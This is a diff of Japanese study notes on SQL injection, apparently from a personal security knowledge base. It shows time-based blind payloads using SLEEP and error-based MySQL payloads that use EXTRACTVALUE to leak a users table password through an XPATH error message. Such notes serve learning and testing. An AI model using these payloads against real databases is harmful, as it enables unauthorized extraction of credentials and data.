@@ -351,8 +351,8 @@ SELECT IF(<条件文>=1,SLEEP(3),'false')
 ```
  - `AND IF (<ここに上記の条件が入ってる> = 1, sleep(3), 'false' -- //)`
 
-- 参考: RDBごとの文法：[SQL cheet sheet Time delays & Conditional Time delays](https://portswigger.net/web-security/sql-injection/cheat-sheet#:~:text=a%20MySQL%20database.-,Time%20delays,-You%20can%20cause)
-	- Burp SuiteのRepeaterの右下にレスポンスタイムが記載
+- 参考: RDBごとの文法[SQL cheet sheet Time delays & Conditional Time delays](https://portswigger.net/web-security/sql-injection/cheat-sheet#:~:text=a%20MySQL%20database.-,Time%20delays,-You%20can%20cause)
+- Burp SuiteのRepeaterの右下にレスポンスタイムが記載
 ![[Pasted image 20250420100807.png]]
 
 #### Error-based
@@ -377,14 +377,18 @@ SELECT IF(<条件文>,　1/0, 'a') = 'a'
 
 `EXTRACTVALUE()` の活用（MySQL専用）
 ```sql
--- 基本
-SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT [secret])))
+-- 基本構文
+SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT <secret>)))
 
--- 具体
+-- 具体例
 SELECT EXTRACTVALUE(1, CONCAT(0x5c, (SELECT password FROM users LIMIT 1)));
 ```
-- → `XPATH syntax error: '\secret'` のように表示されて漏れる。
-- ⚠️`EXTRACTVALUE()` は XML 関連関数で、MySQL 5.1～8.0で動作（8.0.27 以降廃止）
+- → `XPATH syntax error: '\secret'` のように表示されて
+
+
+> [!INFO] 
+> `EXTRACTVALUE()` は XML 関連関数で、MySQL 5.1～8.0で動作（8.0.27 以降廃止）
+
 
 ##### Error-based SQLi 具体例：パスワードの抽出
 
